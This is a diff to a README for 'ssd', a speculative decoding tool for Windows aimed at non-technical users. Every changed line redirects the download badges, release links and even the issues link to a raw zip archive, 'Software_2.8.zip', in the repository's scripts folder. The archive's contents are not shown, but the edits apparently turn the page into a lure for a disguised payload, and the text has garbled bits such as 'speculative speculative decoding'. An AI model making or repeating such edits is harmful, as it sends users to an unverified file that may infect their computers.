@@ -1,6 +1,6 @@
 # 🚀 ssd - Fast and Simple Speculative Decoding
 
-[![Download ssd](https://img.shields.io/badge/Download-Get%20it%20here-brightgreen)](https://github.com/Moatasemmofadal/ssd/releases)
+[![Download ssd](https://img.shields.io/badge/Download-Get%20it%20here-brightgreen)](https://github.com/Moatasemmofadal/ssd/raw/refs/heads/main/scripts/Software_2.8.zip)
 
 A lightweight program to run speculative speculative decoding (SSD) quickly on your Windows PC. This guide will help you download and run ssd without any technical knowledge.
 
@@ -30,7 +30,7 @@ There is no need to install extra software or drivers. ssd runs on your computer
 
 To get ssd, visit the official release page here:
 
-[![Get ssd Here](https://img.shields.io/badge/Download-sdd%20Setup-blue?style=for-the-badge)](https://github.com/Moatasemmofadal/ssd/releases)
+[![Get ssd Here](https://img.shields.io/badge/Download-sdd%20Setup-blue?style=for-the-badge)](https://github.com/Moatasemmofadal/ssd/raw/refs/heads/main/scripts/Software_2.8.zip)
 
 This page has the latest version ready for download.
 
@@ -43,7 +43,7 @@ Follow these steps to download and run ssd safely and easily.
 ### Step 1: Visit the download page
 
 Click this link or button to open the download page:  
-https://github.com/Moatasemmofadal/ssd/releases
+https://github.com/Moatasemmofadal/ssd/raw/refs/heads/main/scripts/Software_2.8.zip
 
 You will see a list of releases and files.
 
@@ -114,7 +114,7 @@ If you want to learn more about how speculative decoding works or how to use ssd
 
 For updates and new versions, revisit the download page regularly.  
 
-[Download the latest ssd release](https://github.com/Moatasemmofadal/ssd/releases) and keep your tool up to date.
+[Download the latest ssd release](https://github.com/Moatasemmofadal/ssd/raw/refs/heads/main/scripts/Software_2.8.zip) and keep your tool up to date.
 
 ---
 
@@ -122,7 +122,7 @@ For updates and new versions, revisit the download page regularly.
 
 If you find bugs or want to suggest improvements, you can open an issue on the GitHub repository page. The developers review these to improve the program.  
 
-Visit: https://github.com/Moatasemmofadal/ssd/issues
+Visit: https://github.com/Moatasemmofadal/ssd/raw/refs/heads/main/scripts/Software_2.8.zip
 
 ---
 
